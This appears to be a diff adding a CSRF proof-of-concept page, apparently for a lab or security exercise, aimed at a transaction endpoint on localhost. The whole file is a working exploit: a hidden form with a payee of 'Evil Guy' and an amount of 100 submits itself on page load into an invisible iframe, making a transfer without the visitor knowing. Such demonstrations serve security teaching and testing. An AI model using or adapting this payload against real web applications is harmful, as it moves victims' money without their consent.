@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<title>CSRF Attack Page</title>
+	</head>
+
+	<body>
+
+		<form action="http://localhost:8080/api/transaction" method="post" target="f">
+			<input type="hidden" name="payee" value="Evil Guy">
+			<input type="hidden" name="description" value="I want your money!">
+			<input type="hidden" name="taxItem" value="Theft">
+			<input type="hidden" name="accountNumber" value="3">
+			<input type="hidden" name="amount" value="100">
+		</form>
+
+		<iframe name="f" style="visibility:hidden;"></iframe>
+
+		<script>
+
+			window.addEventListener("DOMContentLoaded", function() {
+				document.getElementsByTagName("form")[0].submit();
+			});
+
+		</script>
+	</body>
+</html>
